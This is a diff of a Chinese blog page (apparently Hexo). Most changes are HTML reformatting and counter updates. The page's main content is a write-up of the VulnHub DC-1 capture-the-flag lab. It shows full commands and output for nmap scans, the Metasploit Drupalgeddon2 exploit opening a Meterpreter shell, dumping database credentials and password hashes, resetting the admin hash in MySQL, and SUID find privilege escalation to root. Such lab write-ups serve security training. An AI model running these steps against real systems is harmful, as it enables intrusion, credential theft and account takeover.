@@ -296,114 +296,98 @@
       
         <p>安装</p>
 <p>下载解压后使用Vmware打开ova文件，选择桥接模式，同时也将kali设置为桥接模式</p>
-<br>
-
+<p><br></p>
 <p>环境</p>
 <blockquote>
 <p>网段 192.168.18.0/24</p>
 <p>kali 192.168.18.131</p>
 <p>靶机 192.168.18.130</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>扫描网段</p>
 <blockquote>
 <p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
-<p>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
+<p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 21:30 CST Nmap
+scan report for 192.168.18.2 Host is up (0.00015s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.130 Host is
+up (0.00018s latency). MAC Address: 00:0C:29:F4:40:B8 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00036s latency). MAC Address:
+00:50:56:F1:CD:81 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>扫描靶机开放的端口</p>
 <blockquote>
 <p><strong>sudo nmap -sS 192.168.18.130</strong></p>
-<p>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
+<p>Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 21:31 CST Nmap
+scan report for 192.168.18.130 Host is up (0.000079s latency). Not
+shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open
+http 111/tcp open rpcbind MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
 <p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
-<p>注：sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
+<p>注：sS
+：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
 </blockquote>
-<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code> 根据网站页面显示信息可以判断是Drupal的CMS</p>
+<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code>
+根据网站页面显示信息可以判断是Drupal的CMS</p>
 <p>用dirsearch扫一下看看有什么</p>
 <blockquote>
 <p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
 </blockquote>
 <p>用dirb 扫一下试试</p>
 <blockquote>
-<p><strong>dirb <a target="_blank" rel="noopener" href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
+<p><strong>dirb http://192.168.18.130</strong></p>
 </blockquote>
 <p>没找到啥有用的信息，看下robots.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>没什么有用的信息</p>
-<br>
-
+<p><br></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">cd /home/flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd /var/www/site/default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>用python反弹个交互式shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
-<br>
-
-<br>
-
-<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>顺便得到了数据库信息，登录数据库看看</p>
+<h4 id="flag1">flag1</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="flag4">flag4</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">cd /home/flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h4 id="flag2">flag2</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd /var/www/site/default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><br></p>
+<p>用python反弹个交互式shell
+<code>python -c "import pty;pty.spawn('/bin/bash')"</code></p>
+<p><br></p>
+<p><br></p>
+<h4 id="flag3">flag3</h4>
+<p>顺便得到了数据库信息，登录数据库看看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupal密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts/password-hash.sh)</span><br><span class="line">php scripts/password-hash.sh admin  (admin是你要设置的新密码)</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin</span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去数据库修改密码</span><br><span class="line">mysql&gt; update users set pass =&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">重置完密码后登录网站 (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/7debd13b/DCchallenges1.png"></p>
-<br>
-
-<br>
-
-<br>
-
+<p><br></p>
+<p><br></p>
+<p><br></p>
 <p>但是发现当前权限不够</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-
-<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>使用<code>find</code>提权</p>
+<h4 id="flag5">flag5</h4>
+<p>使用<code>find</code>提权</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec ls /root \;</span><br><span class="line">find dctest -exec ls /root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:/var/www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
-<p><a target="_blank" rel="noopener" href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<h2 id="reference">Reference</h2>
+<blockquote>
+<p>https://www.freebuf.com/articles/web/260236.html</p>
+<p>https://blog.csdn.net/wang_624/article/details/90509951</p>
+<p>https://f5.pm/go-53516.html</p>
+<p>https://www.freebuf.com/articles/network/218073.html</p>
+<p>https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</p>
 </blockquote>
 
     </div>
@@ -534,7 +518,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag1"><span class="nav-number">1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag4"><span class="nav-number">2.</span> <span class="nav-text">flag4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag2"><span class="nav-number">3.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag3"><span class="nav-number">4.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag5"><span class="nav-number">5.</span> <span class="nav-text">flag5</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number"></span> <span class="nav-text">Reference</span></a></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#flag1"><span class="nav-number">1.</span> <span class="nav-text">flag1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag4"><span class="nav-number">2.</span> <span class="nav-text">flag4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag2"><span class="nav-number">3.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag3"><span class="nav-number">4.</span> <span class="nav-text">flag3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flag5"><span class="nav-number">5.</span> <span class="nav-text">flag5</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number"></span> <span class="nav-text">Reference</span></a></div>
       </div>
       <!--/noindex-->
 
@@ -550,7 +534,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -598,7 +582,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -612,7 +596,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -623,7 +607,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -763,6 +747,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
